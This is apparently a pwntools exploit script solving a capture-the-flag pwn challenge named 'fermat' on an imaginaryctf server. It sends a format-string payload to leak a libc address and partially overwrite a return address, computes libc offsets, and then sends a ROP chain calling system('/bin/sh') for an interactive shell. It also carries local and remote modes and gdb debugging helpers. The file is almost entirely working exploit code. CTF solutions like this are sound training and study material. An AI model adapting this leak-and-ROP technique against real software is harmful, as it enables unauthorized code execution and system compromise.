from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'fermat.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x1273])


payload = b''
payload += b'|%3$p|'
payload = payload.ljust(0x108, b'\x00')
payload += b'\x44'
r.send(payload)
r.recvuntil(b'|')
leak = int(r.recvuntil(b'|', True), 16)
base = leak - 0x114992
dbg('base')
system = base + 0x50d60
rdi = base + 0x001bc021
binsh = base + 0x1d8698

payload = b''
payload = payload.ljust(0x108, b'\x00')
payload += flat(rdi+1, rdi, binsh, system)

r.send(payload)
r.interactive()
r.close()

